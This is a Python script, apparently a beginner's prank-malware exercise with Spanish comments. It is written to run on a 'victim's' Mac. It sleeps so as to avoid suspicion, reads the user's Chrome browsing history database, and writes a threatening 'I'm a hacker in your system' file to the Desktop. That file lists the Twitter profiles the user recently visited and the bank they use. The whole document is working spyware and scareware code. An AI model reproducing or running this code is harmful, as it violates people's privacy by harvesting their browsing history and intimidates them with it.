from ntpath import join
import os
import sqlite3
import re
from time import sleep
from random import randrange
from venv import create

HACKER_FILE_NAME = "PARA TI.txt"


def delay_action():
    n_hour = randrange(1,4)
    print("Durmiendo por {} horas." .format(n_hour))
    sleep(n_hour)

def create_hacker_file(user_path):
    hacker_file = open(user_path + "/Desktop/" + HACKER_FILE_NAME, "w")
    hacker_file.write("Soy un hacker y me he colado en tu sistema \n")
    return hacker_file


def get_chrome_history(user_path):
    history_path = user_path + "/Library/Application Support/Google/Chrome/Default/History"
    urls = None
    while not urls:
        try:
            connection = sqlite3.connect(history_path)
            cursor = connection.cursor()
            cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER by last_visit_time DESC")
            urls = cursor.fetchall()
            connection.close()
            return urls
        except sqlite3.OperationalError:
            print("Historial inaccesible, intentandolo en 3 segundos")
            sleep(3)

def check_twitter_profiles_and_scare_user(hacker_file, chrome_history):
    profifles_visited = []
    for item in chrome_history[:10]:
        results = re.findall("https://twitter.com/([A-Za-z0-9]+)$", item[2])
        if results and results[0] not in ["notifications", "home", "login"]:
            profifles_visited.append(results[0])
    hacker_file.write("He visto que has estado visitando los perfiles de {} \n".format(", ".join(profifles_visited)))

def check_bank_account(hacker_file, chrome_history):
    banks = ["BBVA", "Sabadell", "Santander", "Bankia", "CaixaBank"]
    his_bank = None
    for item in chrome_history:
        for b in banks:
            if b.lower() in item[0].lower():
                his_bank = b
                break
        if his_bank:
            break
    hacker_file.write("He visto que tienes tu dinero en {} ... Interesante" .format(his_bank))



def main():
    # Determinamos un tiempo de espera para no levantar sospechas
    delay_action()
    # Obtenemos el usuario de la victima
    user_path = "/Users/" + os.environ.get('USER')
    # Creamos un fichero
    hacker_file = create_hacker_file(user_path)
    # Obtenemos el historial del google chrome del usuario
    chrome_history = get_chrome_history(user_path)
    # Escribimos sus visitas en el historial en el fichero
    check_twitter_profiles_and_scare_user(hacker_file, chrome_history)

    check_bank_account(hacker_file, chrome_history)









if __name__ == "__main__":
    main()